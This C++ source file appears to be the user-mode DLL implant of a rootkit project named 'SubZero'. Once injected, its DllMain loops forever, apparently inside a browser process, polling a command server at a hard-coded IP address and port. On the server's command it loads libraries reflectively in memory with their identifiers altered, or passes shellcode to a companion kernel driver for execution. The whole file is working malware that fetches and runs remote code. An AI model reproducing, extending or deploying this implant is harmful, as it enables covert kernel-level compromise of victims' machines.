#include "pch.h"

#include "HttpClient.h"
#include "ReflectiveLibraryLoader.h"
#include "../SubZeroDriver/SubZeroCommon.h"
#include "../SubZeroUtils/RegistryManager.h"
#include "../SubZeroUtils/ServiceManager.h"
#include "../SubZeroUtils/AutoHandle.h"
#include "../SubZeroUtils/DebugPrint.h"
#include "../SubZeroCleanup/SubZeroCleanup.h"

#include <Windows.h>"

constexpr int SecondsToMilliseconds(int seconds) { return seconds * 1000; }

const std::string IpAddress("192.168.14.139");
constexpr int Port = 8080;
constexpr int SecondsBetweenFetches = 5;

void LoadLibraryReflectively_OpcodeHandler(const PVOID Data, const size_t DataLength)
{
    PMEMORY_MODULE hModule = ReflectiveLibraryLoader::MemoryLoadLibrary(Data, DataLength);
    if (nullptr == hModule)
        throw std::runtime_error(DEBUG_TEXT("[-] Library module object failed to initialize"));

    ReflectiveLibraryLoader::OverridePeStringIdentifiers(hModule);
}

void InjectKernelShellcode_OpcodeHandler(const PVOID Data, const size_t DataLength, std::string* ReturnedData, const size_t ReturnedDataSize)
{
    const AutoHandle deviceAutoHandle(::CreateFile(
        L"\\\\.\\" DRIVER_NAME, 
        FILE_SHARE_READ | FILE_SHARE_WRITE, 
        0, 
        nullptr, 
        OPEN_EXISTING,
        0,
        nullptr));
    if (INVALID_HANDLE_VALUE == deviceAutoHandle.get()) 
        throw std::runtime_error(DEBUG_TEXT("[-] Failed to open the device handle"));

	// Create SubZeroExecuteShellcodeData structure
    auto const bufferSize = DataLength + sizeof(SubZeroExecuteShellcodeData);

    const std::unique_ptr<char> inputBuffer(new char[bufferSize]);
    auto* const shellcodeDataStruct = reinterpret_cast<SubZeroExecuteShellcodeData*>(inputBuffer.get());

    shellcodeDataStruct->ShellcodeSize = static_cast<USHORT>(DataLength);
    shellcodeDataStruct->ShellcodeOffset = static_cast<USHORT>(sizeof(SubZeroExecuteShellcodeData));
    shellcodeDataStruct->ReturnedDataMaxSize = ReturnedDataSize;

	// Copy shellcode
    ::memcpy(inputBuffer.get() + shellcodeDataStruct->ShellcodeOffset, Data, shellcodeDataStruct->ShellcodeSize);

    const std::unique_ptr<char>outputBuffer(new char[shellcodeDataStruct->ReturnedDataMaxSize]);

    DWORD bytesReturned = 0;
    if (!::DeviceIoControl(
        deviceAutoHandle.get(),								                // device to be queried
        IOCTL_SUBZERO_EXECUTE_SHELLCODE,						            // operation to perform
        inputBuffer.get(), bufferSize,							            // input buffer
        outputBuffer.get(), shellcodeDataStruct->ReturnedDataMaxSize,	   	// output buffer
        &bytesReturned,                  									// # bytes returned
        nullptr))
        throw std::runtime_error(DEBUG_TEXT("[-] DeviceIoControl Failed"));

	if (0 < bytesReturned)
        ReturnedData->append(outputBuffer.get(), bytesReturned);
}

void ResponseHandler(const ServerOpcode ServerOC, const PVOID Data, const size_t DataLength, std::string* ReturnedData, const size_t ReturnedDataSize)
{	
    switch (ServerOC)
    {
    case ServerOpcode::LoadLibraryReflectively:
        LoadLibraryReflectively_OpcodeHandler(Data, DataLength);
        break;               
    
    case ServerOpcode::InjectKernelShellcode:
        InjectKernelShellcode_OpcodeHandler(Data, DataLength, ReturnedData, ReturnedDataSize);
        break;
    	
    case ServerOpcode::Cleanup:
        SubZeroCleanup::Cleanup();
        break;
    	
    default:        
        throw std::runtime_error(DEBUG_TEXT("[-] Unknown opcode"));
    }
}

BOOL APIENTRY DllMain( HMODULE, DWORD ul_reason_for_call, LPVOID)
{
	std::unique_ptr<HttpClient> httpClient(new HttpClient(IpAddress, Port, ResponseHandler));
	
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
	    try 
        {
            // Endless loop, preventing from the APC queue to empty and launch a Chrome window
            while (true) {
                if (httplib::Error::Success != httpClient->FetchFromServer()) {

                    // Error connecting to server - Try again in 5 seconds
                    httpClient.release();
                    httpClient.reset(new HttpClient(IpAddress, Port, ResponseHandler));
                }

                ::Sleep(SecondsToMilliseconds(SecondsBetweenFetches));
            }
	    }
	    catch (...) {
	    	// Unknown exception
            SubZeroCleanup::Cleanup();
	    }     

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}